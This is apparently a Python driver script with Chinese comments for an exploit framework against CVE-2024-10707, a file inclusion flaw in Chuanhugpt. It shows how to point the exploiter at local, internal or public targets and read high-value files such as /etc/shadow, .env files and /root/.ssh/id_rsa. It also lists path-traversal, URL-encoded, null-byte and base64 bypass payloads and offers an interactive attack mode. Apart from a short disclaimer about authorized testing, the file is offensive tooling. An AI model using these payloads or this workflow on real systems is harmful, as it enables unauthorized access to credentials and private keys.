#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2024-10707 配置示例和使用指南
演示如何正确配置和利用Chuanhugpt文件包含漏洞
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from CHUANHUGPT_FILE_INCLUSION_EXPLOIT import ChuanhugptFileInclusionExploiter, ExploitConfig

def example_1_basic_usage():
    """示例1：基本使用方法"""
    print("=== 示例1：基本使用方法 ===")

    # 配置目标URL - 替换为实际的Chuanhugpt目标
    target_url = "http://your-target-chuanhugpt.com"  # 🔴 修改这里

    # 创建基本配置
    config = ExploitConfig(
        target_url=target_url,
        timeout=15,
        max_retries=3,
        delay_between_requests=2.0,
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    )

    # 创建利用器
    exploiter = ChuanhugptFileInclusionExploiter(config)

    print(f"目标: {target_url}")
    print("开始基本文件包含测试...")

    try:
        # 运行综合利用
        report = exploiter.run_comprehensive_exploitation()

        # 显示结果
        summary = report['exploitation_summary']
        print(f"测试文件数: {summary['total_files_tested']}")
        print(f"成功读取: {summary['successful_reads']}")
        print(f"执行时间: {summary['execution_time']:.2f}秒")

        if report['successful_exploits']:
            print("\n成功读取的文件:")
            for exploit in report['successful_exploits'][:3]:
                print(f"  📁 {exploit['payload_path']}")
                print(f"     置信度: {exploit['confidence']:.2f}")
                print(f"     内容预览: {exploit['file_content'][:100]}...")

        return report

    except Exception as e:
        print(f"❌ 利用失败: {e}")
        return None

def example_2_custom_target():
    """示例2：自定义目标配置"""
    print("\n=== 示例2：自定义目标配置 ===")

    # 针对不同类型的目标配置
    targets = {
        "本地测试": "http://localhost:7860",
        "内网目标": "http://192.168.1.100:7860",
        "公网目标": "https://chuanhugpt.example.com",
        "容器目标": "http://172.17.0.2:7860"
    }

    # 选择目标类型 - 🔴 修改这里
    target_type = "本地测试"  # 可选: "本地测试", "内网目标", "公网目标", "容器目标"
    target_url = targets[target_type]

    # 高级配置
    config = ExploitConfig(
        target_url=target_url,
        timeout=30,  # 增加超时时间
        max_retries=5,  # 增加重试次数
        delay_between_requests=1.5,  # 减少延迟
        user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    )

    print(f"目标类型: {target_type}")
    print(f"目标URL: {target_url}")
    print("配置参数: 超时30s, 重试5次, 延迟1.5s")

    return config

def example_3_specific_file_testing():
    """示例3：测试特定文件"""
    print("\n=== 示例3：测试特定敏感文件 ===")

    # 🔴 修改目标URL
    target_url = "http://your-target.com"
    config = ExploitConfig(target_url=target_url)
    exploiter = ChuanhugptFileInclusionExploiter(config)

    # 高价值文件列表
    high_value_files = [
        "/etc/passwd",           # 用户账户
        "/etc/shadow",           # 密码哈希
        "/etc/hosts",            # 主机映射
        "/proc/version",         # 内核版本
        "/app/config.py",        # 应用配置
        "/app/.env",            # 环境变量
        "/var/www/html/config.php", # Web配置
        "/root/.ssh/id_rsa"      # SSH私钥
    ]

    print("测试高价值文件...")
    successful_files = []

    for file_path in high_value_files:
        print(f"测试: {file_path}")
        result = exploiter.test_file_inclusion(file_path)

        if result.success and result.confidence > 0.6:
            print(f"✅ 成功读取: {file_path}")
            print(f"   置信度: {result.confidence:.2f}")
            print(f"   内容长度: {result.file_size} 字节")
            successful_files.append({
                'path': file_path,
                'confidence': result.confidence,
                'content': result.file_content[:200]
            })
        else:
            print(f"❌ 读取失败: {file_path}")

    if successful_files:
        print(f"\n🎯 成功读取 {len(successful_files)} 个高价值文件:")
        for file_info in successful_files:
            print(f"  📁 {file_info['path']} (置信度: {file_info['confidence']:.2f})")

    return successful_files

def example_4_custom_payloads():
    """示例4：自定义载荷"""
    print("\n=== 示例4：自定义载荷配置 ===")

    target_url = "http://your-target.com"  # 🔴 修改这里
    config = ExploitConfig(target_url=target_url)
    exploiter = ChuanhugptFileInclusionExploiter(config)

    # 自定义恶意JSON载荷
    custom_payloads = {
        "bypass_filter": {
            "file_path": "../../../etc/passwd",
            "dataset": "@/etc/passwd",
            "selection": "../../../../etc/passwd",
            "data": {
                "include": "..%2F..%2F..%2Fetc%2Fpasswd",  # URL编码绕过
                "file": "..\\\\..\\\\..\\\\etc\\\\passwd"   # 双反斜杠绕过
            }
        },
        "null_byte_injection": {
            "file_path": "../../../etc/passwd\\x00.jpg",
            "dataset": "@/etc/passwd\\x00.png",
            "selection": "../../../etc/passwd\\x00.txt"
        },
        "base64_bypass": {
            "file_path": "../../../etc/passwd",
            "encoded": "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",  # base64编码的../../../etc/passwd
            "decode_command": "echo '{{file_path}}' | base64 -d"
        }
    }

    print("测试自定义绕过载荷...")

    for payload_name, payload_data in custom_payloads.items():
        print(f"\n测试载荷: {payload_name}")

        # 创建自定义恶意JSON
        import json
        malicious_json = json.dumps(payload_data, ensure_ascii=False).encode('utf-8')

        # 这里需要扩展exploiter的test_file_inclusion方法来支持自定义载荷
        # 目前作为概念演示
        print(f"载荷数据: {malicious_json[:100]}...")
        print("📝 注意: 需要扩展exploiter以支持自定义载荷")

    return custom_payloads

def example_5_interactive_mode():
    """示例5：交互式模式"""
    print("\n=== 示例5：交互式使用模式 ===")

    # 🔴 修改目标URL
    target_url = input("请输入目标URL (例如: http://target.com): ").strip()

    if not target_url:
        print("❌ 未输入目标URL")
        return None

    config = ExploitConfig(target_url=target_url)
    exploiter = ChuanhugptFileInclusionExploiter(config)

    print(f"\n🎯 目标: {target_url}")
    print("📋 可用命令:")
    print("  1 - 运行完整扫描")
    print("  2 - 测试指定文件")
    print("  3 - 查看目标指纹")
    print("  4 - 生成报告")
    print("  exit - 退出")

    while True:
        try:
            command = input("\n请输入命令: ").strip().lower()

            if command == "exit":
                print("退出交互模式")
                break
            elif command == "1":
                print("开始完整扫描...")
                report = exploiter.run_comprehensive_exploitation()
                print(f"扫描完成，成功读取 {len(report['successful_exploits'])} 个文件")
            elif command == "2":
                file_path = input("请输入文件路径: ").strip()
                if file_path:
                    result = exploiter.test_file_inclusion(file_path)
                    if result.success:
                        print(f"✅ 成功读取: {file_path}")
                        print(f"内容: {result.file_content[:200]}...")
                    else:
                        print(f"❌ 读取失败: {file_path}")
            elif command == "3":
                fingerprint = exploiter._test_fingerprint()
                print(f"指纹识别结果: {fingerprint}")
            elif command == "4":
                print("生成详细报告...")
                report = exploiter.run_comprehensive_exploitation()
                filename = f"cve_2024_10707_report_{hash(target_url)}.json"
                # 这里保存报告到文件
                print(f"报告已保存: {filename}")
            else:
                print("未知命令")

        except KeyboardInterrupt:
            print("\n退出交互模式")
            break
        except Exception as e:
            print(f"❌ 错误: {e}")

def show_setup_guide():
    """显示设置指南"""
    print("\n" + "="*60)
    print("🔧 CVE-2024-10707 利用框架设置指南")
    print("="*60)

    print("\n📋 前置条件:")
    print("1. 目标系统必须运行Chuanhugpt应用")
    print("2. 确认目标存在CVE-2024-10707漏洞")
    print("3. 获得明确的渗透测试授权")

    print("\n🎯 目标识别:")
    print("- Chuanhugpt通常运行在7860端口")
    print("- 默认路径: / /chat /upload")
    print("- 指纹特征: 'chuanhu chat', 'gradio'")

    print("\n⚙️ 配置步骤:")
    print("1. 修改脚本中的target_url变量")
    print("2. 根据目标调整timeout和delay参数")
    print("3. 选择合适的User-Agent")
    print("4. 配置代理 (如需要)")

    print("\n🚀 执行步骤:")
    print("1. 运行基本侦察: python CVE_2024_10707_CONFIG_EXAMPLE.py")
    print("2. 分析目标指纹和应用版本")
    print("3. 执行文件包含利用")
    print("4. 分析提取的敏感数据")
    print("5. 生成详细报告")

    print("\n⚠️ 法律声明:")
    print("- 仅用于授权的安全测试")
    print("- 遵守当地网络安全法律法规")
    print("- 不得用于非法入侵活动")

    print("\n🔗 相关文件:")
    print("- CHUANHUGPT_FILE_INCLUSION_EXPLOIT.py - 主要利用框架")
    print("- CVE_2024_10707_CONFIG_EXAMPLE.py - 配置示例 (本文件)")
    print("- chuanhugpt_file_inclusion_report.json - 生成的报告")

def main():
    """主函数"""
    print("CVE-2024-10707 Chuanhugpt文件包含漏洞利用框架")
    print("="*60)

    # 显示设置指南
    show_setup_guide()

    print("\n选择示例:")
    print("1 - 基本使用方法")
    print("2 - 自定义目标配置")
    print("3 - 测试特定文件")
    print("4 - 自定义载荷")
    print("5 - 交互式模式")
    print("0 - 仅显示设置指南")

    try:
        choice = input("\n请选择 (0-5): ").strip()

        if choice == "1":
            example_1_basic_usage()
        elif choice == "2":
            example_2_custom_target()
        elif choice == "3":
            example_3_specific_file_testing()
        elif choice == "4":
            example_4_custom_payloads()
        elif choice == "5":
            example_5_interactive_mode()
        elif choice == "0":
            print("设置指南已显示完毕")
        else:
            print("无效选择")

    except KeyboardInterrupt:
        print("\n程序退出")
    except Exception as e:
        print(f"❌ 程序错误: {e}")

if __name__ == "__main__":
    main()